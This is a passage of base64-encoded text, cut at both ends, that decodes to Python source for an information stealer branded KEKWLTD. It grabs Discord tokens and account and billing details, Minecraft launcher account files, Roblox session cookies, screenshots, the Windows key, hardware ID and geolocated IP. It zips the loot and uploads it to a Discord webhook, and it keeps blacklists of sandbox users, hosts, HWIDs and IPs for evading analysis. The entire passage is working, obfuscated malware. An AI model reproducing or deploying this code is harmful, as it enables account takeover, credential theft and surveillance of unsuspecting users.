UoZiJ7JyAnKjE3fVNFQVJDSFxueyctJyo1MH1cbntzZWFyY2hfaGlzdG9yeX1cbnsnICcqMTd9XG5cbkxpbmtzIEhpc3RvcnlcbnsnLScqNTB9XG57d2ViX2hpc3Rvcnl9IikKCiAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUobG9naW4pCiAgICAgICAgZi5jbG9zZSgpCgoKICAgIGRlZiBuYXRpZnlfbWF0Y2hlZF90b2tlbnMoc2VsZik6CgogICAgICAgIGYgPSBvcGVuKHNlbGYuZGlyICsgIlxcRGlzY29yZF9JbmZvLnR4dCIsICJ3IiwgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQoKICAgICAgICBmb3IgdG9rZW4gaW4gc2VsZi50b2tlbnM6CiAgICAgICAgICAgIGogPSBodHRweC5nZXQoc2VsZi5kc2NhcDEsIGhlYWRlcnM9c2VsZi5nM3RfSCh0b2tlbikpLmpzb24oKQogICAgICAgICAgICB1c2VyID0gai5nZXQoJ3VzZXJuYW1lJykgKyAnIycgKyBzdHIoai5nZXQoImRpc2NyaW1pbmF0b3IiKSkKCiAgICAgICAgICAgIGJhZGdlcyA9ICIiCiAgICAgICAgICAgIGZsYWdzID0galsnZmxhZ3MnXQogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMSk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIlN0YWZmLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAyKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiUGFydG5lciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkh5cGVzcXVhZCBFdmVudCwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gOCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkdyZWVuIEJ1Z2h1bnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNjQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlc3F1YWQgQnJhdmVyeSwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTI4KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZVNxdWFkIEJyaWxsYW5jZSwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMjU2KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZVNxdWFkIEJhbGFuY2UsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDUxMik6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkVhcmx5IFN1cHBvcnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTYzODQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJHb2xkIEJ1Z0h1bnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTMxMDcyKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiVmVyaWZpZWQgQm90IERldmVsb3BlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNDE5NDMwNCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkFjdGl2ZSBEZXZlbG9wZXIsICIKICAgICAgICAgICAgaWYgKGJhZGdlcyA9PSAiIik6CiAgICAgICAgICAgICAgICBiYWRnZXMgPSAiTm9uZSIKCiAgICAgICAgICAgIGVtYWlsID0gai5nZXQoImVtYWlsIikKICAgICAgICAgICAgcGhvbmUgPSBqLmdldCgicGhvbmUiKSBpZiBqLmdldCgicGhvbmUiKSBlbHNlICJObyBQaG9uZSBOdW1iZXIgYXR0YWNoZWQiCiAgICAgICAgICAgIG5pdHJvX2RhdGEgPSBodHRweC5nZXQoc2VsZi5kc2NhcDEgKyAnL2JpbGxpbmcvc3Vic2NyaXB0aW9ucycsIGhlYWRlcnM9c2VsZi5nM3RfSCh0b2tlbikpLmpzb24oKQogICAgICAgICAgICBoYXNfbml0cm8gPSBGYWxzZQogICAgICAgICAgICBoYXNfbml0cm8gPSBib29sKGxlbihuaXRyb19kYXRhKSA+IDApCiAgICAgICAgICAgIGJpbGxpbmcgPSBib29sKGxlbihqc29uLmxvYWRzKGh0dHB4LmdldChzZWxmLmRzY2FwMSArICIvYmlsbGluZy9wYXltZW50LXNvdXJjZXMiLCBoZWFkZXJzPXNlbGYuZzN0X0godG9rZW4pKS50ZXh0KSkgPiAwKQoKCiAgICAgICAgICAgIGYud3JpdGUoZiJ7JyAnKjE3fXt1c2VyfVxueyctJyo1MH1cbkJpbGxpbmc/OiB7YmlsbGluZ31cbk5pdHJvOiB7aGFzX25pdHJvfVxuQmFkZ2VzOiB7YmFkZ2VzfVxuUGhvbmU6IHtwaG9uZX1cblRva2VuOiB7dG9rZW59XG5FbWFpbDoge2VtYWlsfVxuXG4iKQogICAgICAgIGYuY2xvc2UoKQoKCiAgICBkZWYgZ3JhYmJfbWMoc2VsZik6CiAgICAgICAgbWluZWNyYWZ0cGF0aCA9IG50cGF0aC5qb2luKHNlbGYuZGlyLCAnTWluZWNyYWZ0JykKICAgICAgICBvcy5tYWtlZGlycyhtaW5lY3JhZnRwYXRoLCBleGlzdF9vaz1UcnVlKQogICAgICAgIG1jID0gbnRwYXRoLmpvaW4oc2VsZi5yb2FtaW5nLCAnLm1pbmVjcmFmdCcpCgoKICAgICAgICB0Z3JiID0gWydsYXVuY2hlcl9hY2NvdW50cy5qc29uJywgJ2xhdW5jaGVyX3Byb2ZpbGVzLmpzb24nLCAndXNlcmNhY2hlLmpzb24nLCAnbGF1bmNoZXJfbG9nLnR4dCddCgoKICAgICAgICBmb3IgX2ZpbGUgaW4gdGdyYjoKICAgICAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhudHBhdGguam9pbihtYywgX2ZpbGUpKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5MihudHBhdGguam9pbihtYywgX2ZpbGUpLCBtaW5lY3JhZnRwYXRoICsgc2VsZi5zZXAgKyBfZmlsZSkKCiAgICAgICAgICAgICAgICAKCiAgICBkZWYgZ3JhYmJfcm9ibG94KHNlbGYpOgogICAgICAgIGRlZiBzdWJwcm9jKHBhdGgpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXR1cm4gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoCiAgICAgICAgICAgICAgICAgICAgZnIicG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGgge3BhdGh9OlNPRlRXQVJFXFJvYmxveFxSb2Jsb3hTdHVkaW9Ccm93c2VyXHJvYmxveC5jb20gLU5hbWUgLlJPQkxPU0VDVVJJVFkiLAogICAgICAgICAgICAgICAgICAgIGNyZWF0aW9uZmxhZ3M9MHgwODAwMDAwMCkuZGVjb2RlKCkucnN0cmlwKCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgcmVnX2Nvb2tpZSA9IHN1YnByb2MocidIS0xNJykKICAgICAgICBpZiBub3QgcmVnX2Nvb2tpZToKICAgICAgICAgICAgcmVnX2Nvb2tpZSA9IHN1YnByb2MocidIS0NVJykKICAgICAgICBpZiByZWdfY29va2llOgogICAgICAgICAgICBzZWxmLnJvYmxveGNvb2tpZXMuYXBwZW5kKHJlZ19jb29raWUpCiAgICAgICAgaWYgc2VsZi5yb2Jsb3hjb29raWVzOgogICAgICAgICAgICB3aXRoIG9wZW4oc2VsZi5kaXIgKyAiXFxSb2Jsb3hfQ29va2llcy50eHQiLCAidyIpIGFzIGY6CiAgICAgICAgICAgICAgICBmb3IgaSBpbiBzZWxmLnJvYmxveGNvb2tpZXM6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShpICsgJ1xuJykKCiAgICBkZWYgc3RlYWxfc2NyZWVuKHNlbGYpOgogICAgICAgIGltYWdlID0gSW1hZ2VHcmFiLmdyYWIoCiAgICAgICAgICAgIGJib3g9Tm9uZSwKICAgICAgICAgICAgaW5jbHVkZV9sYXllcmVkX3dpbmRvd3M9RmFsc2UsCiAgICAgICAgICAgIGFsbF9zY3JlZW5zPVRydWUsCiAgICAgICAgICAgIHhkaXNwbGF5PU5vbmUKICAgICAgICApCiAgICAgICAgaW1hZ2Uuc2F2ZShzZWxmLmRpciArICJcXFNjcmVlbnNob3QucG5nIikKICAgICAgICBpbWFnZS5jbG9zZSgpCgogICAgZGVmIHN5c3RlbV9pbmZvcm1hdGlvbnMoc2VsZik6CiAgICAgICAgYWJvdXQgPSBmIiIiCntpbmZvY29tfSB8IHt2Y3RtX3BjfQpXaW5kb3dzIGtleToge3NlbGYudzFuazMzeX0KV2luZG93cyB2ZXJzaW9uOiB7c2VsZi53MW52M3J9ClJBTToge3I0bX1HQgpESVNLOiB7ZDFza31HQgpIV0lEOiB7c2VsZi51dWlkd25ken0KSVA6IHtzZWxmLmlwfQpDaXR5OiB7c2VsZi5jaXR5fQpDb3VudHJ5OiB7c2VsZi5jb3VudHJ5fQpSZWdpb246IHtzZWxmLnJlZ2lvbn0KT3JnOiB7c2VsZi5vcmd9Ckdvb2dsZU1hcHM6IHtzZWxmLmdvb2dsZW1hcH0KICAgICAgICAiIiIKICAgICAgICB3aXRoIG9wZW4oc2VsZi5kaXIgKyAiXFxTeXN0ZW1fSW5mby50eHQiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0naWdub3JlJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShhYm91dCkKCgoKCgoKCiAgICBkZWYgZmluaXNoZWRfYmMoc2VsZik6CiAgICAgICAgZm9yIGkgaW4gb3MubGlzdGRpcihzZWxmLmRpcik6CiAgICAgICAgICAgIGlmIGkuZW5kc3dpdGgoJy50eHQnKToKICAgICAgICAgICAgICAgIHBhdGggPSBzZWxmLmRpciArIHNlbGYuc2VwICsgaQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyIiwgZXJyb3JzPSJpZ25vcmUiKSBhcyBmZjoKICAgICAgICAgICAgICAgICAgICB4ID0gZmYucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHg6CiAgICAgICAgICAgICAgICAgICAgICAgIGZmLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IiwgZXJyb3JzPSJpZ25vcmUiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgiS0VLV0xURCB8IGh0dHBzOi8va2Vrd2x0ZC5ydVxuXG4iKQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgImEiLCBlbmNvZGluZz0idXRmLTgiLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGZwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZnAud3JpdGUoeCArICJcblxuS0VLV0xURCB8IGh0dHBzOi8va2Vrd2x0ZC5ydSIpCgogICAgICAgIF96aXBmaWxlID0gbnRwYXRoLmpvaW4oc2VsZi5hcHBkYXRhLCBmJ0JDLVt7aW5mb2NvbX1dLnppcCcpCiAgICAgICAgemlwcGVkX2ZpbGUgPSB6aXBmaWxlLlppcEZpbGUoX3ppcGZpbGUsICJ3IiwgemlwZmlsZS5aSVBfREVGTEFURUQpCiAgICAgICAgYWJzX3NyYyA9IG50cGF0aC5hYnNwYXRoKHNlbGYuZGlyKQogICAgICAgIGZvciBkaXJuYW1lLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYuZGlyKToKICAgICAgICAgICAgZm9yIGZpbGVuYW1lIGluIGZpbGVzOgogICAgICAgICAgICAgICAgYWJzbmFtZSA9IG50cGF0aC5hYnNwYXRoKG50cGF0aC5qb2luKGRpcm5hbWUsIGZpbGVuYW1lKSkKICAgICAgICAgICAgICAgIGFyY25hbWUgPSBhYnNuYW1lW2xlbihhYnNfc3JjKSArIDE6XQogICAgICAgICAgICAgICAgemlwcGVkX2ZpbGUud3JpdGUoYWJzbmFtZSwgYXJjbmFtZSkKICAgICAgICB6aXBwZWRfZmlsZS5jbG9zZSgpCgogICAgICAgIGZpbGVfY291bnQsIGZpbGVzX2ZvdW5kLCB0b2tlbnMgPSAwLCAnJywgJycKICAgICAgICBmb3IgXywgX18sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5kaXIpOgogICAgICAgICAgICBmb3IgX2ZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBmaWxlc19mb3VuZCArPSBmIuODu3tfZmlsZX1cbiIKICAgICAgICAgICAgICAgIGZpbGVfY291bnQgKz0gMQogICAgICAgIGZvciB0a24gaW4gc2VsZi50b2tlbnM6CiAgICAgICAgICAgIHRva2VucyArPSBmJ3t0a259XG5cbicKICAgICAgICBmaWxlQ291bnQgPSBmIntmaWxlX2NvdW50fSBGaWxlcyBGb3VuZDogIgoKICAgICAgICBlbWJlZCA9IHsKICAgICAgICAgICAgJ25hbWUnOiAiS0VLV0xURCIsCiAgICAgICAgICAgICdhdmF0YXJfdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZycsCiAgICAgICAgICAgICdlbWJlZHMnOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcic6IHsKICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBmJ0tFS1dMVEQgdjIuMycsCiAgICAgICAgICAgICAgICAgICAgICAgICd1cmwnOiAnaHR0cHM6Ly9rZWt3bHRkLnJ1JywKICAgICAgICAgICAgICAgICAgICAgICAgJ2ljb25fdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZycKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICdjb2xvcic6IDM3NDI3NiwKICAgICAgICAgICAgICAgICAgICAnZGVzY3JpcHRpb24nOiBmJ1tLRUtXTFREIGhhcyBHZW8gTG9jYWxpc2VkIHRoaXMgZ3V5XSh7c2VsZi5nb29nbGVtYXB9KScsCiAgICAgICAgICAgICAgICAgICAgJ2ZpZWxkcyc6IFsKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiAnXHUyMDBiJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IGYnJydgYGBmaXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJUDoge3NlbGYuaXAucmVwbGFjZSgiICIsICIgIikgaWYgc2VsZi5pcCBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9yZzoge3NlbGYub3JnLnJlcGxhY2UoIiAiLCAiICIpIGlmIHNlbGYub3JnIGVsc2UgIk4vQSJ9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2l0eToge3NlbGYuY2l0eS5yZXBsYWNlKCIgIiwgIiAiKSBpZiBzZWxmLmNpdHkgZWxzZSAiTi9BIn0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWdpb246IHtzZWxmLnJlZ2lvbi5yZXBsYWNlKCIgIiwgIiAiKSBpZiBzZWxmLnJlZ2lvbiBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvdW50cnk6IHtzZWxmLmNvdW50cnkucmVwbGFjZSgiICIsICIgIikgaWYgc2VsZi5jb3VudHJ5IGVsc2UgIk4vQSJ9YGBgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJycucmVwbGFjZSgnICcsICcnKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpbmxpbmUnOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogJ1x1MjAwYicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBmJycnYGBgZml4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXIgTmFtZToge3ZjdG1fcGMucmVwbGFjZSgiICIsICIgIil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV2luZG93cyBLZXk6IHtzZWxmLncxbmszM3kucmVwbGFjZSgiICIsICIgIil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV2luZG93cyBWZXI6IHtzZWxmLncxbnYzci5yZXBsYWNlKCIgIiwgIiAiKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXNrIFN0b2NrYWdlOiB7ZDFza31HQgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJhbSBTdG9ja2FnZToge3I0bX1HQmBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnLnJlcGxhY2UoJyAnLCAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzogVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6ICcqKi0gVG9rZW5zOioqJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IGYnJydgYGB5YW1sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge3Rva2VucyBpZiB0b2tlbnMgZWxzZSAidG9rZW5zIG5vdCBmb3VuZCJ9YGBgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJycucmVwbGFjZSgnICcsICcnKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpbmxpbmUnOiBGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IGZpbGVDb3VudCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IGYnJydgYGBpbmkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge2ZpbGVzX2ZvdW5kLnN0cmlwKCl9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXWBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnLnJlcGxhY2UoJyAnLCAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzogRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAgICAgJ2Zvb3Rlcic6IHsKICAgICAgICAgICAgICAgICAgICAgICAgJ3RleHQnOiAnS0VLV0xUROODu2h0dHBzOi8va2Vrd2x0ZC5ydScKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0KICAgICAgICB9CgoKICAgICAgICB3aXRoIG9wZW4oX3ppcGZpbGUsICdyYicpIGFzIGY6CiAgICAgICAgICAgIGlmIHNlbGYucmVnZXhfd2ViaG9va19kc2MgaW4gc2VsZi5kaXNjb3JkX3dlYmhvb2s6CiAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBqc29uPWVtYmVkKQogICAgICAgICAgICAgICAgaHR0cHgucG9zdChzZWxmLmRpc2NvcmRfd2ViaG9vaywgZmlsZXM9eyd1cGxvYWRfZmlsZSc6IGZ9KQogICAgICAgIG9zLnJlbW92ZShfemlwZmlsZSkKCgoKCgoKCmNsYXNzIE5vRGVidWdnKEZ1bmN0aW9ucyk6CiAgICBpblZNID0gRmFsc2UKCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5wcm9jZXNzZXMgPSBsaXN0KCkKCiAgICAgICAgc2VsZi5ibHVzZXVycyA9IFsKICAgICAgICAgICAgIldEQUdVdGlsaXR5QWNjb3VudCIsICJCdkpDaFJQbnN4biIsICJIYXJyeSBKb2huc29uIiwgIlNxZ0ZPZjNHIiwgIlJHemNCVXlyem5SZWciLCAiaDdkazF4UHIiLCJSb2JlcnQiLCAiQWJieSIsICJQZXRlciBXaWxzb24iLCAiaG1hcmMiLCAicGF0ZXgiLCAiSk9ITi1QQyIsICJSRGhKMENORmV2elgiLCAia0VlY2ZNd2dqIiwgIkZyYW5rIiwgIjhObDBDb2xOUTVicSIsCiAgICAgICAgICAgICJMaXNhIiwgIkpvaG4iLCAiZ2VvcmdlIiwgIlB4bWRVT3BWeXgiLCAiOFZpelNNIiwgIncwZmp1T1ZtQ2NQNUEiLCAibG1Wd2pqOWIiLCAiUHFPTmpIVndleHNTIiwgIjN1MnY5bTgiLCAiSnVsaWEiLCAiSEVVZVJ6bCIsCiAgICAgICAgXQogICAgICAgIHNlbGYuYmxwY25hbWUgPSBbCiAgICAgICAgICAgICJERVNLVE9QLUNETE5WT1EiLCAiQkVFNzM3MEMtOEMwQy00IiwgIkRFU0tUT1AtTkFLRkZNVCIsICJXSU4tNUUwN0NPUzlBTFIiLCAiQjMwRjAyNDItMUM2QS00IiwgIkRFU0tUT1AtVlJTUUxBRyIsICJROUlBVFJLUFJIIiwgIlhDNjRaQiIsICJERVNLVE9QLUQwMTlHRE0iLAogICAgICAgICAgICAiREVTS1RPUC1XSThDTEVUIiwgIlNFUlZFUjEiLCAiTElTQS1QQyIsICJKT0hOLVBDIiwgIkRFU0tUT1AtQjBUOTNENiIsICJERVNLVE9QLTFQWUtQMjkiLCAiREVTS1RPUC0xWTI0MzNSIiwgIldJTEVZUEMiLCAiV09SSyIsICI2QzRFNzMzRi1DMkQ5LTQiLAogICAgICAgICAgICAiUkFMUEhTLVBDIiwgIkRFU0tUT1AtV0czTVlKUyIsICJERVNLVE9QLTdYQzZHRVoiLCAiREVTS1RPUC01T1Y5UzBPIiwgIlFhclpocmRCcGoiLCAiT1JFTEVFUEMiLCAiQVJDSElCQUxEUEMiLCAiSlVMSUEtUEMiLCAiZDFibkprZlZsSCIsICJERVNLVE9QLUIwVDkzRDYiCiAgICAgICAgXQogICAgICAgIHNlbGYuYmxod2lkID0gWwogICAgICAgICAgICAiN0FCNUM0OTQtMzlGNS00OTQxLTkxNjMtNDdGNTRENkQ1MDE2IiwgIjAzMkUwMkI0LTA0OTktMDVDMy0wODA2LTNDMDcwMDA4MDAwOSIsICIwM0RFMDI5NC0wNDgwLTA1REUtMUEwNi0zNTA3MDAwODAwMDkiLAogICAgICAgICAgICAiMTExMTExMTEtMjIyMi0zMzMzLTQ0NDQtNTU1NTU1NTU1NTU1IiwgIjZGM0NBNUVDLUJFQzktNEE0RC04Mjc0LTExMTY4RjY0MDA1OCIsICJBREVFRUU5RS1FRjBBLTZCODQtQjE0Qi1CODNBNTRBRkM1NDgiLAogICAgICAgICAgICAiNEM0QzQ1NDQtMDA1MC0zNzEwLTgwNTgtQ0FDMDRGNTkzNDRBIiwgIjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLUFDMUY2QkQwNDk3MiIsICI3OUFGNTI3OS0xNkNGLTQwOTQtOTc1OC1GODhBNjE2RDgxQjQiLAogICAgICAgICAgICAiNUJEMjRENTYtNzg5Ri04NDY4LTdDREMtQ0FBNzIyMkNDMTIxIiwgIjQ5NDM0RDUzLTAyMDAtOTA2NS0yNTAwLTY1OTAyNTAwRTQzOSIsICI0OTQzNEQ1My0wMjAwLTkwMzYtMjUwMC0zNjkwMjUwMEYwMjIiLAogICAgICAgICAgICAiNzc3RDg0QjMtODhEMS00NTFDLTkzRTQtRDIzNTE3NzQyMEE3IiwgIjQ5NDM0RDUzLTAyMDAtOTAzNi0yNTAwLTM2OTAyNTAwMEM2NSIsICJCMTExMjA0Mi01MkU4LUUyNUItMzY1NS02QTRGNTQxNTVEQkYiLAogICAgICAgICAgICAiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtQUMxRjZCRDA0OEZFIiwgIkVCMTY5MjRCLUZCNkQtNEZBMS04NjY2LTE3QjkxRjYyRkIzNyIsICJBMTVBOTMwQy04MjUxLTk2NDUtQUY2My1FNDVBRDcyOEMyMEMiLAogICAgICAgICAgICAiNjdFNTk1RUItNTRBQy00RkYwLUI1RTMtM0RBN0M3QjU0N0UzIiwgIkM3RDIzMzQyLUE1RDQtNjhBMS01OUFDLUNGNDBGNzM1QjM2MyIsICI2MzIwMzM0Mi0wRUIwLUFBMUEtNERGNS0zRkIzN0RCQjA2NzAiLAogICAgICAgICAgICAiNDRCOTRENTYtNjVBQi1EQzAyLTg2QTAtOTgxNDNBNzQyM0JGIiwgIjY2MDgwMDNGLUVDRTQtNDk0RS1CMDdFLTFDNDYxNUQxRDkzQyIsICJEOTE0MjA0Mi04RjUxLTVFRkYtRDVGOC1FRTlBRTNEMTYwMkEiLAogICAgICAgICAgICAiNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDAzQUYwIiwgIjhCNEU4Mjc4LTUyNUMtNzM0My1CODI1LTI4MEFFQkNEM0JDQiIsICI0RDREREM5NC1FMDZDLTQ0RjQtOTVGRS0zM0ExQURBNUFDMjciLAogICAgICAgICAgICAiQkI2NEUwNDQtODdCQS1DODQ3LUJDMEEtQzc5N0QxQTE2QTUwIiwgIjJFNkZCNTk0LTlENTUtNDQyNC04RTc0LUNFMjVBMjVFMzZCMCIsICI0MkE4MjA0Mi0zRjEzLTUxMkYtNUUzRC02QkY0RkZGRDg1MTgiCiAgICAgICAgXQogICAgICAgIHNlbGYuYmxpcHMgPSBbCiAgICAgICAgICAgICc4OC4xMzIuMjMxLjcxJywgJzc4LjEzOS44LjUwJywgJzIwLjk5LjE2MC4xNzMnLCAnODguMTUzLjE5OS4xNjknLCAnODQuMTQ3LjYyLjEyJywgCiAgICAgICAgICAgICcxOTQuMTU0Ljc4LjE2MCcsICc5Mi4yMTEuMTA5LjE2MCcsICcxOTUuNzQuNzYuMjIyJywgJzE4OC4xMDUuOTEuMTE2JywgJzM0LjEwNS4xODMuNjgnLCAKICAgICAgICAgICAgJzkyLjIxMS41NS4xOTknLCAnNzkuMTA0LjIwOS4zMycsICc5NS4yNS4yMDQuOTAnLCAnMzQuMTQ1Ljg5LjE3NCcsICcxMDkuNzQuMTU0LjkwJywgCiAgICAgICAgICAgICcxMDkuMTQ1LjE3My4xNjknLCAnMzQuMTQxLjE0Ni4xMTQnLCAnMjEyLjExOS4yMjcuMTUxJywgJzE5NS4yMzkuNTEuNTknLCAnMTkyLjQwLjU3LjIzNCcsIAogICAgICAgICAgICAnNjQuMTI0LjEyLjE2MicsICczNC4xNDIuNzQuMjIwJywgJzE4OC4xMDUuOTEuMTczJywgJzEwOS43NC4xNTQuOTEnLCAnMzQuMTA1LjcyLjI0MScsCiAgICAgICAgICAgICAnMTA5Ljc0LjE1NC45MicsICcyMTMuMzMuMTQyLjUwJywgJzEwOS43NC4xNTQuOTEnLCAnOTMuMjE2Ljc1LjIwOScsICcxOTIuODcuMjguMTAzJywgCiAgICAgICAgICAgICAnODguMTMyLjIyNi4yMDMnLCAnMTk1LjE4MS4xNzUuMTA1JywgJzg4LjEzMi4yMjUuMTAwJywgJzkyLjIxMS4xOTIuMTQ0JywgJzM0LjgzLjQ2LjEzMCcsIAogICAgICAgICAgICAgJzE4OC4xMDUuOTEuMTQzJywgJzM0Ljg1LjI0My4yNDEnLCAnMzQuMTQxLjI0NS4yNScsICcxNzguMjM5LjE2NS43MCcsICc4NC4xNDcuNTQuMTEzJywgCiAgICAgICAgICAgICAnMTkzLjEyOC4xMTQuNDUnLCAnOTUuMjUuODEuMjQnLCAnOTIuMjExLjUyLjYyJywgJzg4LjEzMi4yMjcuMjM4JywgJzM1LjE5OS42LjEzJywgCiAgICAgICAgICAgICAnODAuMjExLjAuOTcnLCAnMzQuODUuMjUzLjE3MCcsICcyMy4xMjguMjQ4LjQ2JywgJzM1LjIyOS42OS4yMjcnLCAnMzQuMTM4Ljk2LjIzJywgCiAgICAgICAgICAgICAnMTkyLjIxMS4xMTAuNzQnLCAnMzUuMjM3LjQ3LjEyJywgJzg3LjE2Ni41MC4yMTMnLCAnMzQuMjUzLjI0OC4yMjgnLCAnMjEyLjExOS4yMjcuMTY3JywgCiAgICAgICAgICAgICAnMTkzLjIyNS4xOTMuMjAxJywgJzM0LjE0NS4xOTUuNTgnLCAnMzQuMTA1LjAuMjcnLCAnMTk1LjIzOS41MS4zJywgJzM1LjE5Mi45My4xMDcnCiAgICAgICAgICAgICBdCgogICAgICAgIGZvciBmdW5jIGluIFtzZWxmLmxzdGNoZWMsIHNlbGYucmVna2V5LCBzZWxmLnNwM2NDaGVxXToKICAgICAgICAgICAgcHJvY2VzcyA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWZ1bmMsIGRhZW1vbj1UcnVlKQogICAgICAgICAgICBzZWxmLnByb2Nlc3Nlcy5hcHBlbmQocHJvY2VzcykKICAgICAgICAgICAgcHJvY2Vz